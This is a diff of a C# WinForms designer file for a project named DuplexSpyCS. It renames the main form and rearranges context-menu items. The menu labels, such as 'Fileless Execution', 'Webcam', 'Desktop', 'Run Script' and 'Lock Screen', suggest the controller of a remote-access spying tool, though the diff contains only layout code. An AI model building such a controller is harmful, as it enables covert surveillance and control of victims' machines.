@@ -1,6 +1,6 @@
 ﻿namespace DuplexSpyCS
 {
-    partial class Form1
+    partial class frmMain
     {
         /// <summary>
         ///  Required designer variable.
@@ -29,7 +29,7 @@
         private void InitializeComponent()
         {
             components = new System.ComponentModel.Container();
-            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(frmMain));
             contextMenuStrip1 = new ContextMenuStrip(components);
             toolStripMenuItem11 = new ToolStripMenuItem();
             toolStripMenuItem6 = new ToolStripMenuItem();
@@ -50,6 +50,7 @@
             toolStripMenuItem26 = new ToolStripMenuItem();
             toolStripSeparator5 = new ToolStripSeparator();
             toolStripMenuItem40 = new ToolStripMenuItem();
+            toolStripMenuItem44 = new ToolStripMenuItem();
             toolStripSeparator3 = new ToolStripSeparator();
             toolStripMenuItem10 = new ToolStripMenuItem();
             toolStripMenuItem14 = new ToolStripMenuItem();
@@ -118,7 +119,6 @@
             contextMenuStrip2 = new ContextMenuStrip(components);
             toolStripMenuItem42 = new ToolStripMenuItem();
             toolStripMenuItem43 = new ToolStripMenuItem();
-            toolStripMenuItem44 = new ToolStripMenuItem();
             contextMenuStrip1.SuspendLayout();
             toolStrip1.SuspendLayout();
             toolStrip2.SuspendLayout();
@@ -133,7 +133,7 @@
             contextMenuStrip1.Font = new Font("Microsoft JhengHei UI", 11.25F, FontStyle.Regular, GraphicsUnit.Point);
             contextMenuStrip1.Items.AddRange(new ToolStripItem[] { toolStripMenuItem11, toolStripMenuItem6, toolStripSeparator2, toolStripMenuItem25, toolStripMenuItem1, toolStripMenuItem2, toolStripMenuItem3, toolStripMenuItem8, toolStripMenuItem24, toolStripMenuItem7, toolStripMenuItem9, toolStripMenuItem44, toolStripSeparator3, toolStripMenuItem10, toolStripMenuItem27, toolStripMenuItem33, toolStripMenuItem16, toolStripMenuItem37 });
             contextMenuStrip1.Name = "contextMenuStrip1";
-            contextMenuStrip1.Size = new Size(181, 422);
+            contextMenuStrip1.Size = new Size(170, 400);
             // 
             // toolStripMenuItem11
             // 
@@ -265,6 +265,13 @@
             toolStripMenuItem40.Text = "Fileless Execution";
             toolStripMenuItem40.Click += toolStripMenuItem40_Click;
             // 
+            // toolStripMenuItem44
+            // 
+            toolStripMenuItem44.Name = "toolStripMenuItem44";
+            toolStripMenuItem44.Size = new Size(169, 24);
+            toolStripMenuItem44.Text = "Plugin";
+            toolStripMenuItem44.Click += toolStripMenuItem44_Click;
+            // 
             // toolStripSeparator3
             // 
             toolStripSeparator3.Name = "toolStripSeparator3";
@@ -280,40 +287,40 @@
             // toolStripMenuItem14
             // 
             toolStripMenuItem14.Name = "toolStripMenuItem14";
-            toolStripMenuItem14.Size = new Size(180, 24);
+            toolStripMenuItem14.Size = new Size(161, 24);
             toolStripMenuItem14.Text = "Desktop";
             toolStripMenuItem14.Click += toolStripMenuItem14_Click;
             // 
             // toolStripMenuItem15
             // 
             toolStripMenuItem15.Name = "toolStripMenuItem15";
-            toolStripMenuItem15.Size = new Size(180, 24);
+            toolStripMenuItem15.Size = new Size(161, 24);
             toolStripMenuItem15.Text = "Webcam";
             toolStripMenuItem15.Click += toolStripMenuItem15_Click;
             // 
             // toolStripSeparator4
             // 
             toolStripSeparator4.Name = "toolStripSeparator4";
-            toolStripSeparator4.Size = new Size(177, 6);
+            toolStripSeparator4.Size = new Size(158, 6);
             // 
             // toolStripMenuItem17
             // 
             toolStripMenuItem17.Name = "toolStripMenuItem17";
-            toolStripMenuItem17.Size = new Size(180, 24);
+            toolStripMenuItem17.Size = new Size(161, 24);
             toolStripMenuItem17.Text = "Lock Screen";
             toolStripMenuItem17.Click += toolStripMenuItem17_Click;
             // 
             // toolStripMenuItem23
             // 
             toolStripMenuItem23.Name = "toolStripMenuItem23";
-            toolStripMenuItem23.Size = new Size(180, 24);
+            toolStripMenuItem23.Size = new Size(161, 24);
             toolStripMenuItem23.Text = "Run Script";
             toolStripMenuItem23.Click += toolStripMenuItem23_Click;
             // 
             // toolStripMenuItem32
             // 
             toolStripMenuItem32.Name = "toolStripMenuItem32";
-            toolStripMenuItem32.Size = new Size(180, 24);
+            toolStripMenuItem32.Size = new Size(161, 24);
             toolStripMenuItem32.Text = "URL";
             toolStripMenuItem32.Click += toolStripMenuItem32_Click;
             // 
@@ -605,6 +612,7 @@
             toolStrip2.Stretch = true;
             toolStrip2.TabIndex = 4;
             toolStrip2.Text = "toolStrip2";
+            toolStrip2.ItemClicked += toolStrip2_ItemClicked;
             // 
             // toolStripButton5
             // 
@@ -750,14 +758,7 @@
             toolStripMenuItem43.Text = "Disconnect";
             toolStripMenuItem43.Click += toolStripMenuItem43_Click;
             // 
-            // toolStripMenuItem44
-            // 
-            toolStripMenuItem44.Name = "toolStripMenuItem44";
-            toolStripMenuItem44.Size = new Size(180, 24);
-            toolStripMenuItem44.Text = "Plugin";
-            toolStripMenuItem44.Click += toolStripMenuItem44_Click;
-            // 
-            // Form1
+            // frmMain
             // 
             AutoScaleDimensions = new SizeF(10F, 20F);
             AutoScaleMode = AutoScaleMode.Font;
@@ -767,10 +768,10 @@
             Controls.Add(toolStrip1);
             Font = new Font("Microsoft JhengHei UI", 12F, FontStyle.Regular, GraphicsUnit.Point);
             Margin = new Padding(5);
-            Name = "Form1";
+            Name = "frmMain";
             StartPosition = FormStartPosition.CenterScreen;
             Text = "Form1";
-            Load += Form1_Load;
+            Load += frmMain_Load;
             contextMenuStrip1.ResumeLayout(false);
             toolStrip1.ResumeLayout(false);
             toolStrip1.PerformLayout();
